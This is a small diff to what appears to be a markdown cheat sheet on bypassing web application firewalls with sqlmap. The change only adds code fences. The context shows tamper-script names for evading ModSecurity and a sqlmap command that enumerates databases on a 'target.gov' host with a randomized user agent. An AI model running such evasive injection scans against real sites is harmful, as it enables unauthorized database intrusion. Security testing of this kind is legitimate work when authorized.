@@ -102,7 +102,9 @@ tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest
 ```
 
 ## bypass 403 Not Acceptable
+```
 - sqlmap -u "target.gov" --level 5 --dbs --random-agent -v 3 --batch 
+```
 
 ##  bypass 500 internal server error 
 ```
